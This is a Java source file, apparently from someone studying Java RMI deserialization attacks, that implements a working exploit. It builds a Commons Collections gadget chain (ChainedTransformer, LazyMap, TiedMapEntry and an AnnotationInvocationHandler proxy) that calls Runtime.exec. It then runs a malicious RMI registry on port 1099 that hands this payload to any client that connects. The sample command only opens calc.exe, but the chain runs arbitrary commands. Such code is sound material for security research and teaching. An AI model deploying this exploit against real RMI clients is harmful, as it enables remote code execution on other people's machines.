package com.lingx5.RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIRegistry {

    public static void main(String[] args) throws Exception {
        // 1. 构造命令执行链
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}) // 弹出计算器
        };
        ChainedTransformer chain = new ChainedTransformer(transforms);

        // 2. 创建 LazyMap 并设置触发键
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "lingx5");
        Map<Object, Object> map = new HashMap<>();
        map.put(tiedMapEntry, "lingx5");

        // 3. 反射修改 LazyMap 的 factory 为恶意链
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chain);
        lazyMap.remove("lingx5");

        // 4. 创建 AnnotationInvocationHandler 代理
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, map);

        // 5. 创建动态代理对象（使用 Retention 接口）
        Class<?> retentionClass = Retention.class;
        Remote remoteProxy = (Remote) Proxy.newProxyInstance(
                retentionClass.getClassLoader(),
                new Class[]{Remote.class, retentionClass}, // 实现 Remote 和 Retention 接口
                handler
        );

        // 6. 启动 RMI 注册中心
        Registry registry = LocateRegistry.createRegistry(1099);

        // 7. 反射注入恶意对象到注册中心的 bindings
        Field bindingsField = registry.getClass().getDeclaredField("bindings");
        bindingsField.setAccessible(true);
        Map<String, Remote> bindings = (Map<String, Remote>) bindingsField.get(registry);
//        bindings.put("exploit", remoteProxy); // 绑定恶意对象到名称 "exploit"
        registry.bind("exploit", remoteProxy);
        System.out.println("RMI 注册中心已启动");
        // 保持注册中心运行
        Thread.currentThread().join();

    }
}